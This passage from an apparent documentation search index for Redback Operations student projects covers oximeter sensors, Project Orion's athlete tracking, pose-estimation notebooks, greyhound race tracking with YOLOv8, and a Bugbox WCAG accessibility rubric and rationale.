Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#conclusion","content":" The MAX30102 sensor is a pivotal component of our player tracking and crowd monitoring project. Its capabilities ensure that our system exceeds the necessary standards for effective real-time health monitoring in sports and event management. ","version":"Next","tagName":"h2"},{"title":"MQTT Types and Selection of MQTT","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/MQTT-types","content":"MQTT Types and Selection of MQTT","keywords":"","version":"Next"},{"title":"Understanding Oximeter Sensor Technology","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#introduction","content":" Oximeter sensor technology is a pivotal innovation in medical and health monitoring, enabling the non-invasive measurement of an individual's oxygen saturation level (SpO2) and heart rate. This report elucidates the fundamental principles, operation, and applications of oximeter sensor technology, particularly in wearable devices and health monitoring systems.  ","version":"Next","tagName":"h2"},{"title":"Principles of Oximetry​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#principles-of-oximetry","content":" Oximetry is based on the principle that oxygenated and deoxygenated hemoglobin absorb light differently. Oxygenated hemoglobin (oxyhemoglobin) absorbs more infrared light, while deoxygenated hemoglobin (deoxyhemoglobin) absorbs more red light. By emitting both red and infrared light into the bloodstream and measuring the absorption of these light waves, oximeter sensors can determine the SpO2 level, which is the percentage of oxygen-saturated hemoglobin in the blood.  ","version":"Next","tagName":"h2"},{"title":"How Oximeter Sensors Work​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#how-oximeter-sensors-work","content":" Light Emission: An oximeter sensor emits light from two LEDs—one red (visible light) and one infrared (IR). These light sources pass through the body part, often a fingertip or earlobe, where the sensor is placed.Detection: On the opposite side of the emitting light, a photodetector captures the light that traverses the body part. Due to pulsatile blood flow, the amount of absorbed light varies with each heartbeat, affecting the light intensity detected by the photodetector.Data Analysis: The sensor measures the variations in light absorption during pulsatile changes. By comparing the absorption of red and infrared light, the device calculates the ratio of oxygenated to deoxygenated hemoglobin, which is then converted into a percentage indicating the SpO2 level.Heart Rate Measurement: Additionally, the time between each pulse of blood can be used to calculate the heart rate, as the fluctuations in light absorption directly correlate with the heart's beating pattern.  ","version":"Next","tagName":"h2"},{"title":"Key Components of Oximeter Sensors​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#key-components-of-oximeter-sensors","content":" LEDs: Light-emitting diodes that emit red and infrared light.Photodetector: A sensor that detects the amount of light passing through the skin, providing data for calculating SpO2 levels.Microcontroller: Processes the signals from the photodetector, performing calculations to derive the SpO2 level and heart rate.Display/Output Interface: Shows the calculated SpO2 level and heart rate to the user.  ","version":"Next","tagName":"h2"},{"title":"Applications and Importance​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#applications-and-importance","content":" Oximeter sensors are widely used in clinical settings, home health care, and wearable health devices, offering a critical tool for monitoring respiratory and cardiovascular health. They play a vital role in diagnosing and managing conditions such as chronic obstructive pulmonary disease (COPD), heart failure, and COVID-19.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Understanding Oximeter Sensor Technology","url":"/redback-documentation/docs/project-4/iot/Oximeter_Sensor_Technology_Documentation#conclusion","content":" Oximeter sensor technology provides a non-invasive, accurate, and invaluable means of monitoring oxygen saturation and heart rate. Its integration into wearable technology and health monitoring systems has revolutionized patient care, allowing for continuous, real-time health tracking. As technology advances, further enhancements in oximeter sensors are expected, expanding their applications and improving health outcomes.  This report has outlined the operational principles and significance of oximeter sensor technology, emphasizing its critical role in modern health monitoring practices. ","version":"Next","tagName":"h2"},{"title":"PiCam and RaspberryPi Setup","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/PiCam-and-RaspberryPi-setup","content":"PiCam and RaspberryPi Setup","keywords":"","version":"Next"},{"title":"Setting up the Project Website Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Setting-up-Website-Report","content":"Setting up the Project Website Report","keywords":"","version":"Next"},{"title":"Setup Guide Accelerometer Sensor","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/setup-accelerometer","content":"Setup Guide Accelerometer Sensor","keywords":"","version":"Next"},{"title":"Project Orion","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Overview/Project-Overview","content":"","keywords":"","version":"Next"},{"title":"Logo​","type":1,"pageTitle":"Project Orion","url":"/redback-documentation/docs/project-4/Overview/Project-Overview#logo","content":"   ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"Project Orion","url":"/redback-documentation/docs/project-4/Overview/Project-Overview#overview","content":" Project Orion's primary objective is to forge an intelligent, real-time tracking system for athletes. By harmonising sophisticated computer vision technology, Project Orion is set to profoundly enhance our comprehension of athletes' movements, interactions, and overall performance on the field.  ","version":"Next","tagName":"h2"},{"title":"Technological Foundation​","type":1,"pageTitle":"Project Orion","url":"/redback-documentation/docs/project-4/Overview/Project-Overview#technological-foundation","content":" At the heart of Project Orion lies its formidable data analysis prowess. Utilising the power of machine learning and predictive modelling, the project aims to transform complex streams of data into practical, actionable insights. Whether it's foreseeing potential injuries or monitoring athletes' fatigue levels, Project Orion's predictive capabilities are designed to convert raw data into essential knowledge. This knowledge will amplify performance standards in various sports.  Strategic Shift: From IoT to Computer Vision  Previously, the team focused on both crowd monitoring and player tracking, but decided to steer away from IoT and sensor use to focus work on computer vision technologies moving forward.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Project Orion","url":"/redback-documentation/docs/project-4/Overview/Project-Overview#conclusion","content":" In essence, Project Orion seeks to mirror the guiding brilliance of its celestial counterpart, aspiring to illuminate the sports technology landscape with innovative strategies focused on athlete safety and performance enhancement. This venture is poised to redefine the frontiers of technological applications in sports, positioning Project Orion as a pioneer and a source of inspiration in its field. ","version":"Next","tagName":"h2"},{"title":"Pose Estimation and Matching Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics","content":"","keywords":"","version":"Next"},{"title":"Summary​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#summary","content":" ","version":"Next","tagName":"h2"},{"title":"Libraries Used​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#libraries-used","content":" pandasmatplotlib.pyplotseaborn  ","version":"Next","tagName":"h3"},{"title":"Key Components​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#key-components","content":" Data Loading: Loading pose data from CSV files.Data Visualization: Plotting processing time, detected keypoints, and confidence scores.Pairwise Plot: Visualizing relationships between key metrics.  ","version":"Next","tagName":"h3"},{"title":"Documentation​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#documentation","content":" ","version":"Next","tagName":"h2"},{"title":"Functions​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#functions","content":" import pandas as pd​  Imports the pandas library for data manipulation and analysis.  import matplotlib.pyplot as plt​  Imports the matplotlib library for creating visualizations.  import seaborn as sns​  Imports the seaborn library for statistical data visualization.  pd.read_csv(&quot;pose_data.csv&quot;)​  Loads pose data from a CSV file into a DataFrame.  pd.read_csv(&quot;video_pose_data.csv&quot;)​  Loads video pose data from a CSV file into a DataFrame.  plt.plot(data_df['frame'], data_df['processing_time_ms'])​  Plots the processing time per frame.  plt.plot(data_df['frame'], data_df['detected_keypoints'])​  Plots the number of detected keypoints per frame.  plt.hist(all_confidences, bins=20)​  Creates a histogram for confidence scores distribution.  sns.pairplot(data_df[['frame', 'processing_time_ms', 'detected_keypoints']])​  Creates a pairwise plot of key metrics.  ","version":"Next","tagName":"h3"},{"title":"Data Collection​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#data-collection","content":" Data is collected for each frame and saved to a CSV file for further analysis.  ","version":"Next","tagName":"h3"},{"title":"Real-Time Processing​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#real-time-processing","content":" Real-time pose estimation is performed on video feeds, with the results displayed in real-time.  ","version":"Next","tagName":"h3"},{"title":"Pose Matching​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#pose-matching","content":" The similarity between poses in two images is calculated and displayed.  ","version":"Next","tagName":"h3"},{"title":"Usage​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#usage","content":" Data Loading: Load pose data from CSV files.Data Visualization: Visualize processing time, detected keypoints, and confidence scores.Pairwise Plot: Visualize relationships between key metrics.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_data_analytics#conclusion","content":" This project focuses on pose estimation Data Analytics and its usecase and application in improving accuracy and keyframe detection. This file is used to visualise data from the pose_estimation_matching.ipynb model and detect weakpoints in the algorithm. ","version":"Next","tagName":"h2"},{"title":"pose_estimation_fitness","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness","content":"","keywords":"","version":"Next"},{"title":"Code Location : Redback-Operations/redback-orion/tree/main/Player_Tracking/Pose_Matching_project/Pose_Estimation/pose-estimation-fitness​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#code-location--redback-operationsredback-oriontreemainplayer_trackingpose_matching_projectpose_estimationpose-estimation-fitness","content":" Pose Estimation Fitness Project  This project focuses on pose estimation and strain analysis for fitness applications using a pre-trained Keypoint R-CNN model. The primary goal is to detect keypoints, evaluate exercise form, and visualize strain metrics.  ","version":"Next","tagName":"h2"},{"title":"Summary​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#summary","content":" ","version":"Next","tagName":"h2"},{"title":"Libraries Used​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#libraries-used","content":" oscv2 (OpenCV)matplotlib.pyplotnumpytorchcsv  ","version":"Next","tagName":"h3"},{"title":"Key Components​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#key-components","content":" Pose Estimation Model: Uses a pre-trained Keypoint R-CNN model from torchvision.Strain Analysis: Calculates strain metrics for specific exercises (e.g., deadlift, bench press, squat).Visualization: Draws poses and highlights areas of high strain.CSV Handling: Saves and loads strain results to/from CSV files.Best/Worst Form Analysis: Identifies and displays the best and worst exercise forms based on strain metrics.Graphical Output: Generates strain metric graphs for visualization.  ","version":"Next","tagName":"h3"},{"title":"Documentation​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#documentation","content":" ","version":"Next","tagName":"h2"},{"title":"Functions​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#functions","content":" load_pose_model(device='cpu')​  Loads the pre-trained Keypoint R-CNN model.  pose_estimation(image, model, device='cpu')​  Performs pose estimation on an image.  draw_pose(image, keypoints, strain_results=None, threshold=0.5)​  Draws poses on an image and highlights areas of high strain.  calculate_strain(keypoints, exercise_type)​  Calculates strain metrics based on keypoints and exercise type.  save_strain_results_to_csv(strain_results, csv_path)​  Saves strain results to a CSV file.  load_strain_results_from_csv(csv_path)​  Loads strain results from a CSV file.  evaluate_images(data_dir, model, device, exercise_type)​  Evaluates all images in a directory and identifies the best form.  display_best_and_worst_images_with_strain(data_dir, model, device, exercise_type)​  Displays the best and worst exercise forms with corresponding strain graphs.  ","version":"Next","tagName":"h3"},{"title":"Usage​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#usage","content":" Setup: Install dependencies and prepare the dataDeadlift directory with exercise images.Run: Execute the main script to analyze exercise form.Visualization: View poses, strain metrics, and graphs for each image.Analysis: Identify the best and worst exercise forms based on strain metrics.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"pose_estimation_fitness","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_fitness#conclusion","content":" This project provides a comprehensive solution for pose estimation and strain analysis in fitness applications. It can be applied to sports analytics, personal training, and rehabilitation. ","version":"Next","tagName":"h2"},{"title":"Pose Estimation and Matching Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching","content":"","keywords":"","version":"Next"},{"title":"Summary​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#summary","content":" ","version":"Next","tagName":"h2"},{"title":"Libraries Used​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#libraries-used","content":" oscv2 (OpenCV)matplotlib.pyplotnumpypandastimetorch  ","version":"Next","tagName":"h3"},{"title":"Key Components​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#key-components","content":" YOLO Model Loading: The YOLO model is loaded using torch.hub.load.Pose Estimation Parameters: Parameters such as input width, height, and threshold are defined.Body Parts and Pose Pairs: Dictionaries and lists defining body parts and their connections.Image Processing: Images are read, processed, and displayed using OpenCV and Matplotlib.Data Collection: Data such as frame number, processing time, detected keypoints, and confidence scores are collected and saved to a CSV file.Pose Classification: Functions to classify poses based on detected keypoints.Video Processing: Real-time pose estimation on video feeds using OpenCV.Pose Matching: Functions to calculate the similarity between poses in two images.  ","version":"Next","tagName":"h3"},{"title":"Documentation​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#documentation","content":" ","version":"Next","tagName":"h2"},{"title":"Functions​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#functions","content":" classify_pose(points)​  Classifies the pose based on keypoints.  yolo_pose_estimation(image)​  Performs pose estimation using the YOLO model.  pose_estimation(frame, frame_id)​  Estimates the pose in a given frame and returns the processed frame and pose label.  pose_estimation(frame)​  Estimates the pose in a given frame using OpenCV’s DNN module.  euclidean_distance(point1, point2)​  Calculates the Euclidean distance between two points.  calculate_similarity_percentage(keypoints1, keypoints2, max_distance=200)​  Calculates the similarity percentage between two sets of keypoints.  resize_to_same_height(img1, img2)​  Resizes two images to have the same height.  ","version":"Next","tagName":"h3"},{"title":"Data Collection​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#data-collection","content":" Data is collected for each frame and saved to a CSV file for further analysis.  ","version":"Next","tagName":"h3"},{"title":"Real-Time Processing​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#real-time-processing","content":" Real-time pose estimation is performed on video feeds, with the results displayed in real-time.  ","version":"Next","tagName":"h3"},{"title":"Pose Matching​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#pose-matching","content":" The similarity between poses in two images is calculated and displayed.  ","version":"Next","tagName":"h3"},{"title":"Usage​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#usage","content":" Image Processing: Load and process images to estimate poses and classify them.Video Processing: Perform real-time pose estimation on video feeds.Pose Matching: Compare the similarity between poses in two images.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Pose Estimation and Matching Project","url":"/redback-documentation/docs/project-4/Pose-estimation/pose_estimation_matching#conclusion","content":" This project provides a comprehensive solution for pose estimation and matching using deep learning techniques. It can be applied to various domains such as sports analytics, fitness applications, and human-computer interaction. ","version":"Next","tagName":"h2"},{"title":"Greyhound Detection and Tracking Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#overview","content":" This project focuses on detecting and tracking greyhounds in races. Using YOLOv8 for object detection and tracking, the system highlights all the dogs in each video frame by putting a bounding box around them or identifying their number. Additionally, it calculates their relative speeds.  ","version":"Next","tagName":"h2"},{"title":"Watch the Project in Action​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#watch-the-project-in-action","content":" Watch the video demonstration of greyhound detectionView our project on RoboflowRelative speed of greyhounds  ","version":"Next","tagName":"h3"},{"title":"Features​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#features","content":" Greyhound Detection: Accurately detects and identifies all greyhounds in each video frame.Tracking and Sorting: Tracks the positions of the greyhounds throughout the race.Bounding Boxes: Draws consistent bounding boxes around detected greyhounds.Speed Calculation: Calculates the relative speed of each greyhound in the race, though further refinement is needed.Custom Dataset: Created and labeled a large custom dataset using Roboflow, with tasks distributed among team members for efficient data labeling.  ","version":"Next","tagName":"h2"},{"title":"Installation​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#installation","content":" ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#prerequisites","content":" NumPyMatplotlibUltralyticsOpenCVKerasGraphvizPydot  ","version":"Next","tagName":"h3"},{"title":"Steps​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#steps","content":" Clone the Repository: git clone https://github.com/rissicay/redback-orion Install Dependencies: pip install -r requirements.txt Download the Dataset: Use the Roboflow dataset link to download the training data. Setup YOLOv8: Follow the YOLOv8 installation guide to set up the detection model.  ","version":"Next","tagName":"h3"},{"title":"Dataset​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#dataset","content":" The dataset used for training the model includes a large collection of images of greyhounds, labeled and annotated using Roboflow. The dataset was created by the team, with tasks distributed among members to efficiently label each image, ensuring a high-quality dataset to improve the model's performance.  ","version":"Next","tagName":"h2"},{"title":"Challenges Faced​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#challenges-faced","content":" Close Proximity Detection: Initial challenges included difficulties in detecting greyhounds when they were close together. This was mitigated by expanding the dataset and refining the model.Obstruction Issues: Detecting greyhounds behind railings or other obstacles required additional training data and fine-tuning of the model.Speed Calculation: The speed feature was added to the system, but it requires further refinement to ensure accurate measurements.Dataset Management: Creating and labeling a large dataset involved coordination among team members to ensure consistency and accuracy.  ","version":"Next","tagName":"h2"},{"title":"Future Work​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#future-work","content":" Further Model Refinement: Continue refining the model to enhance accuracy and robustness.Speed Feature Improvement: Improve the speed calculation feature for more accurate real-time tracking.Automated Testing Pipeline: Implement an automated testing pipeline to validate the model against new datasets.Extended Features: Explore adding features such as live commentaries.  ","version":"Next","tagName":"h2"},{"title":"Contributing​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#contributing","content":" Contributions are welcome! Please follow the standard contribution guidelines:  Fork the repository.Create a new branch (git checkout -b feature-branch).Make your changes and commit them (git commit -m 'Add some feature').Push to the branch (git push origin feature-branch).Open a pull request.  ","version":"Next","tagName":"h2"},{"title":"Contributors ✨​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#contributors-sparkles","content":" Harsh BhanotMohitpreet SingChris Abbey  ","version":"Next","tagName":"h2"},{"title":"License​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#license","content":" This project is licensed under the MIT License.  ","version":"Next","tagName":"h2"},{"title":"Acknowledgements​","type":1,"pageTitle":"Greyhound Detection and Tracking Project","url":"/redback-documentation/docs/project-4/Player-Tracking/Greyhounds_tracking#acknowledgements","content":" We would like to extend our gratitude to the following:  YOLOv8 and Ultralytics Communities: Thank you for your contributions to the field of object detection and tracking. Your work has been instrumental in the development of our project.Roboflow: Special thanks for providing platform and annotation tools that have significantly contributed to the accuracy and efficiency of our model. ","version":"Next","tagName":"h2"},{"title":"Bugbox Accessibility Marking Rubric","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#introduction","content":" The Bugbox Accessibility Marking Rubric is designed to verify that the Accessibility guidelines have been adhered to throughout the design and coding of the Bugbox website.  ","version":"Next","tagName":"h2"},{"title":"Web Content Accessibility Guidelines (WCAG) Marking Rubric For Bugbox​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#web-content-accessibility-guidelines-wcag-marking-rubric-for-bugbox","content":" This rubric assesses web content based on WCAG 2.2 compliance at Level A and AA.  Assessor's Name: ____________________________    ","version":"Next","tagName":"h2"},{"title":"Assessment Criteria​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#assessment-criteria","content":" Criterion\tLevel\tDescription\tScore (0-2)\tCommentsNon-text Content\tA\tEnsures all non-text content has a text alternative (e.g., alt text for images). Audio and Video (Prerecorded)\tA\tProvides captions and audio descriptions for prerecorded media. Captions (Live)\tAA\tEnsures live audio content has captions. Contrast (Minimum)\tAA\tText and images meet minimum contrast ratio requirements. Resize Text\tAA\tContent remains readable when resized up to 200%. Keyboard Accessibility\tA\tEnsures all functionality is operable through a keyboard. No Keyboard Trap\tA\tUsers can navigate freely using the keyboard. Bypass Blocks\tA\tProvides mechanisms to skip repeated content. Page Titled\tA\tEach web page has a descriptive title. Focus Order\tA\tFocus moves in a logical order. Link Purpose (In Context)\tA\tThe purpose of each link is clear from the text. Headings and Labels\tAA\tHeadings and labels describe the topic or purpose. Focus Visible\tAA\tA visible focus indicator is present for interactive elements. Language of Page\tA\tThe primary language of the page is identified. Consistent Navigation\tAA\tNavigation elements are consistent across pages. Error Identification\tA\tErrors are clearly identified and described. Error Suggestion\tAA\tSuggestions are provided for resolving input errors. Status Messages\tAA\tStatus updates are conveyed to assistive technologies. Orientation\tAA\tContent is usable in both portrait and landscape mode. Content on Hover or Focus\tAA\tAdditional content on hover/focus is dismissible, hoverable, and persistent. Pointer Gestures\tA\tAll functionality can be operated without complex gestures. Target Size (Minimum)\tAA\tClickable elements are large enough to be easily accessed. Consistent Help\tA\tProvides consistent help mechanisms across the site. Accessible Authentication (Minimum)\tAA\tLogins and authentication methods are accessible.     ","version":"Next","tagName":"h2"},{"title":"Scoring Guide​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#scoring-guide","content":" 0 = Not Met (Does not meet the requirement)1 = Partially Met (Some elements are accessible, but improvements are needed)2 = Fully Met (Meets the requirement completely)    ","version":"Next","tagName":"h2"},{"title":"Final Score: ___ / 50​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#final-score-___--50","content":"   ","version":"Next","tagName":"h3"},{"title":"Comments:​","type":1,"pageTitle":"Bugbox Accessibility Marking Rubric","url":"/redback-documentation/docs/project-5/Accessibility/Accessibility-marking-rubric#comments","content":"                ","version":"Next","tagName":"h3"},{"title":"What is Accessibility and Why Do We Need It for Bugbox?","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Accessibility/Accessiblity-and-why","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"What is Accessibility and Why Do We Need It for Bugbox?","url":"/redback-documentation/docs/project-5/Accessibility/Accessiblity-and-why#introduction","content":" Accessibility is the practice of designing products, services, or environments to be usable by people with a wide range of abilities and disabilities, addressing needs like visual, auditory, mobility, or cognitive impairments. The aim is to remove barriers and ensure equal participation for all. In Australia, about 1 in 6 children (16%) live with a disability, requiring tailored accommodations in areas such as education, healthcare, and daily life.  For an educational platform like Bugbox, accessibility means ensuring that all learners, regardless of their physical or cognitive challenges, can fully participate and benefit from the learning experience.  Some key areas of accessibility in the digital sense include:  Visual Accessibility – This involves making content accessible to people with visual impairments. For example, making sure text is readable for people with low vision, providing alternative descriptions for images, and ensuring screen reader compatibility. Auditory Accessibility – This focuses on making audio content accessible to people who are deaf or hard of hearing. This can include adding captions to videos, providing transcripts, or offering sign language interpretation for video lessons. Motor Accessibility – Ensuring that people with motor impairments can easily interact with the platform. This might mean designing for keyboard navigation, using voice controls, or offering other forms of input that don’t rely solely on a mouse. Cognitive Accessibility – This is about making content easy to understand for people with learning disabilities or cognitive impairments. For example, using simple language, clear instructions, and allowing students to learn at their own pace.  ","version":"Next","tagName":"h2"},{"title":"Why Accessibility is Important for Bugbox?​","type":1,"pageTitle":"What is Accessibility and Why Do We Need It for Bugbox?","url":"/redback-documentation/docs/project-5/Accessibility/Accessiblity-and-why#why-accessibility-is-important-for-bugbox","content":" Bugbox’s mission is to help students learn STEM subjects (Science, Technology, Engineering, and Math) in an engaging and hands-on way. The goal is to equip students with the skills they need to thrive in the technology-driven world. Since Bugbox is focused on helping all students become creative and innovative, it is crucial that the platform be accessible to everyone, including those with disabilities.  Here’s why accessibility is so important for Bugbox:  Equal Opportunities for All Students Bugbox wants to ensure every student has the same chance to succeed, no matter their abilities. By focusing on accessibility, the platform can support learners with disabilities, ensuring they don’t miss out on the educational opportunities that Bugbox provides. Meeting the Diverse Needs of Learners Every student has their own unique way of learning. Accessibility features can help meet these different needs. For example, some students might need larger text, different navigation options, or audio descriptions. These changes not only help students with disabilities but also benefit others who learn in different ways or at different paces. Legal and Ethical Responsibility Accessibility is not only important for fairness—it’s also legally required in many places, including Australia. Laws like the Disability Discrimination Act 1992 (DDA) make it mandatory for organizations to ensure that products, services, and environments are accessible to people with disabilities. For Bugbox, adhering to these regulations is essential to ensure that the platform is inclusive and respects the rights of all users. Improving the User Experience for Everyone Accessibility features can actually enhance the experience for all users, not just those with disabilities. For example, captions can help learners who are not fluent in the language of instruction or those who are in noisy environments. By designing with accessibility in mind, Bugbox can make its platform easier to use and more enjoyable for everyone. Encouraging Creativity and Problem Solving Focusing on accessibility isn’t just about making the platform usable for everyone—it’s also an opportunity to inspire creative thinking. By solving accessibility challenges, Bugbox can encourage students to think differently about technology, and they might even come up with new ideas that can make the world more accessible for everyone.  ","version":"Next","tagName":"h2"},{"title":"How Bugbox Can Implement Accessibility.​","type":1,"pageTitle":"What is Accessibility and Why Do We Need It for Bugbox?","url":"/redback-documentation/docs/project-5/Accessibility/Accessiblity-and-why#how-bugbox-can-implement-accessibility","content":" To ensure accessibility is part of the design, Bugbox can take several steps:  User-Centered Design: It’s important to get feedback from students with various needs and involve them in the design process. This ensures that the platform meets their needs and remains user-friendly for everyone. Following Accessibility Guidelines: Bugbox should follow the Web Content Accessibility Guidelines (WCAG), which provide a clear framework for making websites and online tools more accessible. Flexible Learning Tools: The platform can include tools that adapt to each student’s abilities. For example, giving students the option to adjust text sizes or change the speed of lessons can help them learn at their own pace. Training and Support for Teachers: Educators should be trained on how to use Bugbox’s accessibility features. This will help them support students with disabilities and create an inclusive learning environment.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"What is Accessibility and Why Do We Need It for Bugbox?","url":"/redback-documentation/docs/project-5/Accessibility/Accessiblity-and-why#conclusion","content":" Accessibility is an essential part of Bugbox’s goal to make STEM education engaging and open to all students. By ensuring the platform is easy to use for everyone, Bugbox helps students develop the skills they need to succeed in a technology-driven world. Accessibility doesn’t just benefit students with disabilities; it improves the overall experience for everyone, making Bugbox a more inclusive and innovative place to learn. In the end, accessibility is a core value that supports Bugbox’s mission to inspire the next generation of creators. ","version":"Next","tagName":"h2"},{"title":"Accessibility Validation Tools and Their 